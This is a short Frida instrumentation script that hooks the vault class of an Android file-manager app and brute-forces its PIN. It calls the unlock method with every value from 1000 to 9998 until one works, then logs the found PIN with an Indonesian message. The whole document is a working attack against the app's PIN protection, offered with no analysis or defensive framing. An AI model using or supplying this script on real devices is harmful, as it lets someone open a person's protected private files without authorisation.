console.log("Starting hook...")
Java.perform(function(){
    var it = setInterval(function(){
    try{
        var Vault = Java.use("com.mobisystems.libfilemng.vault.Vault")        
        for(var i=1000;i<9999;i++){
            var ret_value = Vault.unlock(i.toString());
            console.log("[+] testing PIN: "+i+" "+"ret_value: "+ ret_value);
            if(ret_value!=null){
                console.log("[*] PIN ditemukan: " + i);
                clearInterval(it);
                return;
            }
        }
     
    } catch(e) {
      console.log("failed!");
      clearInterval(it);
    }
  },200);
})
